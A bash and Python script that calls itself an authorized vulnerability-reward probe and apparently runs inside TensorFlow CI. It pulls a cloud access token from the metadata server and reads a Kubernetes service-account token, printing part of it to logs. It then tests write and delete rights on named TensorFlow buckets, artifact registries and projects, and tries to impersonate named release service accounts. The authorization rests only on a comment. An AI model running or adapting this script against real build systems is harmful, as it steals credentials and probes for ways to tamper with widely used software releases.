#!/bin/bash
# Authorized OSS VRP read-only IAM/identity probe. No uploads.
set +e
PYBIN=""
if command -v python3 >/dev/null 2>&1; then
  PYBIN=python3
elif command -v python >/dev/null 2>&1; then
  PYBIN=python
fi
if [[ -z "$PYBIN" ]]; then
  echo "PROBE no_python"
  id || true
  exit 0
fi
"$PYBIN" <<'PY'
import json, os, socket, ssl, urllib.error, urllib.parse, urllib.request

META = "http://metadata.google.internal/computeMetadata/v1"
MH = {"Metadata-Flavor": "Google"}
CTX = ssl.create_default_context()

def http(url, headers=None, data=None, method=None, timeout=12):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            body = r.read().decode("utf-8", "replace")
            return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace") if e.fp else ""
        return e.code, body[:2000]
    except Exception as e:
        return 0, str(e)[:500]

def meta(path):
    st, body = http(META + path, headers=MH, timeout=5)
    return body.strip() if st == 200 else "ERR %s %s" % (st, body[:200])

print("PROBE hostname=", socket.gethostname())
print("PROBE uid=", os.getuid(), "euid=", os.geteuid(), "user=", os.environ.get("USER"))
print("PROBE pwd=", os.getcwd())
print("PROBE GITHUB_EVENT_NAME=", os.environ.get("GITHUB_EVENT_NAME"))
print("PROBE GITHUB_REPOSITORY=", os.environ.get("GITHUB_REPOSITORY"))
print("PROBE GITHUB_ACTOR=", os.environ.get("GITHUB_ACTOR"))
print("PROBE TFCI=", os.environ.get("TFCI"))
print("PROBE ACTIONS_ID_TOKEN_REQUEST_URL=", bool(os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")))
print("PROBE docker.sock=", os.path.exists("/var/run/docker.sock"))
print("PROBE GAC=", os.environ.get("GOOGLE_APPLICATION_CREDENTIALS"))
print("PROBE email=", meta("/instance/service-accounts/default/email"))
print("PROBE scopes=", meta("/instance/service-accounts/default/scopes").replace("\n", " "))
print("PROBE project_id=", meta("/project/project-id"))
print("PROBE numeric=", meta("/project/numeric-project-id"))
print("PROBE inst_name=", meta("/instance/name"))
print("PROBE inst_zone=", meta("/instance/zone"))
print("PROBE inst_attrs=", meta("/instance/attributes/?recursive=true")[:1500])

tok_st, tok_body = http(META + "/instance/service-accounts/default/token", headers=MH, timeout=5)
print("PROBE token_status=", tok_st)
token = ""
if tok_st == 200:
    try:
        token = json.loads(tok_body).get("access_token", "")
    except Exception as e:
        print("PROBE token_parse=", e)
print("PROBE token_len=", len(token))
AH = {"Authorization": "Bearer " + token, "Content-Type": "application/json"} if token else {}

for p in (
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
):
    try:
        with open(p) as f:
            v = f.read().strip()
        print("PROBE k8s", p, "=", v[:80] if "token" in p else v)
    except Exception as e:
        print("PROBE k8s", p, "=", type(e).__name__)

def post_json(url, payload):
    return http(url, headers=AH, data=json.dumps(payload).encode(), method="POST")

STORAGE_PERMS = [
    "storage.objects.get", "storage.objects.list", "storage.objects.create",
    "storage.objects.update", "storage.objects.delete", "storage.buckets.get",
    "storage.buckets.list", "storage.buckets.update",
]
AR_PERMS = [
    "artifactregistry.repositories.get", "artifactregistry.repositories.list",
    "artifactregistry.repositories.downloadArtifacts",
    "artifactregistry.repositories.uploadArtifacts",
    "artifactregistry.repositories.deleteArtifacts",
    "artifactregistry.repositories.update",
]
PROJ_PERMS = [
    "storage.objects.create", "storage.objects.delete",
    "artifactregistry.repositories.uploadArtifacts",
    "cloudbuild.builds.create", "cloudbuild.builds.list",
    "iam.serviceAccounts.actAs", "iam.serviceAccounts.getAccessToken",
    "container.pods.exec", "container.secrets.get", "compute.instances.create",
]
RBE_PERMS = [
    "remotebuildexecution.blobs.create",
    "remotebuildexecution.actions.update",
    "remotebuildexecution.actionresults.update",
]
buckets = [
    "tensorflow", "tensorflow-ci-staging", "tensorflow-devinfra-bazel-cache",
    "tensorflow-macos-bazel-cache", "tf-builds", "tensorflow-testing",
    "general-ml-ci-transient", "ml-oss-artifacts-published", "keras",
]
ars = [
    "projects/ml-oss-artifacts-published/locations/us/repositories/tf-public-nightly-artifacts-registry",
    "projects/ml-oss-artifacts-published/locations/us/repositories/pypi-mirror",
    "projects/ml-oss-artifacts-published/locations/us/repositories/ml-public-container",
]
projects = [
    "tensorflow-testing", "ml-velocity-actions-production",
    "ml-oss-artifacts-published", "tensorflow", "tensorflow-sigs",
]
if token:
    for b in buckets:
        st, body = post_json(
            "https://storage.googleapis.com/storage/v1/b/%s/iam/testIamPermissions" % b,
            {"permissions": STORAGE_PERMS},
        )
        print("PROBE gcs_%s=%s %s" % (b, st, body[:800].replace("\n", " ")))
    for ar in ars:
        st, body = post_json(
            "https://artifactregistry.googleapis.com/v1/%s:testIamPermissions" % ar,
            {"permissions": AR_PERMS},
        )
        print("PROBE ar_%s=%s %s" % (ar.replace("/", "_"), st, body[:800].replace("\n", " ")))
    for p in projects:
        st, body = post_json(
            "https://cloudresourcemanager.googleapis.com/v1/projects/%s:testIamPermissions" % p,
            {"permissions": PROJ_PERMS},
        )
        print("PROBE proj_%s=%s %s" % (p, st, body[:800].replace("\n", " ")))
        st, body = post_json(
            "https://cloudresourcemanager.googleapis.com/v1/projects/%s:testIamPermissions" % p,
            {"permissions": RBE_PERMS},
        )
        print("PROBE rbe_%s=%s %s" % (p, st, body[:800].replace("\n", " ")))
        st, body = http(
            "https://artifactregistry.googleapis.com/v1/projects/%s/locations/-/repositories" % p,
            headers=AH, timeout=12,
        )
        print("PROBE ar_list_%s=%s %s" % (p, st, body[:600].replace("\n", " ")))
        st, body = http(
            "https://storage.googleapis.com/storage/v1/b?project=%s" % p,
            headers=AH, timeout=12,
        )
        print("PROBE gcs_list_%s=%s %s" % (p, st, body[:600].replace("\n", " ")))
    emails = [
        meta("/instance/service-accounts/default/email"),
        "workload-tensorflow-sa@ml-velocity-actions-production.iam.gserviceaccount.com",
        "workload-keras-sa@ml-velocity-actions-production.iam.gserviceaccount.com",
        "tensorflow-release-binary-uploader@tensorflow-testing.iam.gserviceaccount.com",
    ]
    for email in emails:
        if not email or str(email).startswith("ERR"):
            continue
        st, body = post_json(
            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/"
            + urllib.parse.quote(email, safe="@.")
            + ":generateAccessToken",
            {"scope": ["https://www.googleapis.com/auth/cloud-platform"]},
        )
        print("PROBE impersonate_%s=%s %s" % (email, st, body[:400].replace("\n", " ")))
else:
    print("PROBE no_token")
print("PROBE done")
PY
